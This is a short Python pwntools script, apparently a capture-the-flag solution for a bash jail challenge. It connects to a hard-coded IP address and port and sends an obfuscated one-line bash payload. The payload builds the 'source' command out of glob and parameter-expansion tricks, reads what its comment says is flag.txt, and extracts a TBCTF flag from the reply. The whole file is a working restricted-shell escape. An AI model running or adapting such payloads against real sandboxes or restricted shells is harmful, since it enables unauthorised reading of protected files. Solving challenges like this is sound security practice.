#!/usr/bin/env python3
from pwn import remote
import re

HOST = "13.127.119.28"
PORT = 1337

# Build "." from "jail.sh", then source the first 8-char glob match: flag.txt.
PAYLOAD = b": ???????;__=$_;__=${__#????};__=${__:$#:${##}};${__} ????????"


def main() -> None:
    r = remote(HOST, PORT)
    r.recvuntil(b"Nash> ")
    r.sendline(PAYLOAD)
    data = r.recvrepeat(2).decode("utf-8", "ignore")
    print(data, end="")

    match = re.search(r"TBCTF\{[^}]+\}", data)
    if match:
        print(match.group(0))

    r.close()


if __name__ == "__main__":
    main()
